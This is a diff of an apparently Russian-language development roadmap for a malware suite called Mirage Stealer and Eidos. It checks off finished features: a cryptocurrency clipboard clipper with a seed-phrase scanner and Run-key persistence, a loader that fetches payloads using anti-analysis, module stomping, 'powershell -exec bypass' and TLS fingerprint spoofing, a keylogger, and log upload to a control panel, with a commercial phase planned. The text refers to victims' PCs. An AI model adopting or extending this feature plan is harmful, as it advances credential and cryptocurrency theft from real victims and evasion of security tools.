@@ -59,7 +59,7 @@ EIDS ECOSYSTEM
 Phase 1-11: Mirage Stealer Core  ████████████████████  142/142 ✅
 Phase 8b: Integration Tests      ████████████████████   8/8 ✅
 
-Phase 12: Eidos Ecosystem        ░░░░░░░░░░░░░░░░░░░░   0/16
+Phase 12: Eidos Ecosystem        ████████████████████  16/16 ✅
 Phase 13: Mirage — Infrastructure ████████████████████  22/22 ✅
 Phase 14: Eidos Panel Premium    ░░░░░░░░░░░░░░░░░░░░   0/48
 Phase 15: Eidos Commercial       ░░░░░░░░░░░░░░░░░░░░   0/17
@@ -103,21 +103,21 @@ Phase 15: Eidos Commercial       ░░░░░░░░░░░░░░░�
 > Эти модули — отдельные проекты, которые могут работать независимо.
 > Mirage Stealer может их загрузить и запустить после отработки.
 
-### 12.1 Eidos Clipper (отдельный проект, ~50 KB, нерезидентный)
-- [ ] OpenClipboard polling monitor (SetWindowsHookEx)
-- [ ] BTC (Legacy 1, SegWit 3, bech32 bc1, bc1p)
-- [ ] ETH + EVM-совместимые (0x...)
-- [ ] TRX, XMR, SOL, TON, LTC, DASH, DOGE, ADA, XLM, BCH
-- [ ] Работает до перезагрузки ПК жертвы
-- [ ] Отправка логов на Eidos Panel
+### 12.1 Eidos Clipper (модуль внутри Mirage, build: zig build)
+- [x] OpenClipboard polling мониторинг (GetClipboardSequenceNumber)
+- [x] BTC (Legacy 1, SegWit 3, bech32 bc1, bc1p)
+- [x] ETH + EVM, TRX, SOL, TON, LTC, DASH, DOGE, ADA, XLM, BCH
+- [x] Seed phrase scanner (BIP39 wordlist)
+- [x] Регистрация в автозагрузке (HKCU\...\Run)
+- [x] Отправка логов на Eidos Panel
 
-### 12.2 Eidos Loader (отдельный проект, ~30 KB, stage 1)
-- [ ] Anti-analysis → HTTP GET payload → CreateProcess → Delete
-- [ ] .exe → CreateProcessW (CREATE_NO_WINDOW)
-- [ ] .dll → LdrLoadDll
-- [ ] .ps1 → powershell -exec bypass
-- [ ] Multi-file (до 10), env var expansion, target dir
-- [ ] Может развернуть Mirage Stealer, Eidos Clipper, Eidos Keylogger
+### 12.2 Eidos Loader (отдельный проект, D:\...\Loaders\EidosLoader)
+- [x] Anti-analysis → HTTP GET → Module stomping → Execute
+- [x] .exe → CreateProcessW (CREATE_NO_WINDOW)
+- [x] .dll → LdrLoadDll
+- [x] .ps1 → powershell -exec bypass
+- [x] DoH, Native TLS, JA3/JA4 spoofing
+- [x] Может развернуть Mirage Stealer и Eidos Clipper
 
 ### 12.3 Eidos Keylogger (модуль внутри Mirage Stealer)
 - [x] `keylogger/keylogger.zig` — WH_KEYBOARD_LL hook + message loop + unicode support
